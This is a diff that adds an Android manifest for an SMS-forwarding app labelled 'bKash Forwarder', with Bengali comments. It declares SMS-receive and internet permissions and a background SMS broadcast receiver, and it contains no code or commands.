@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.smsforwarder">
+
+    <!-- SMS পড়ার এবং ইন্টারনেটে পাঠানোর পারমিশন -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <application
+        android:allowBackup="true"
+        android:label="bKash Forwarder"
+        android:supportsRtl="true">
+        
+        <!-- ব্যাকগ্রাউন্ডে মেসেজ রিসিভ করার লজিক -->
+        <receiver android:name=".SmsReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
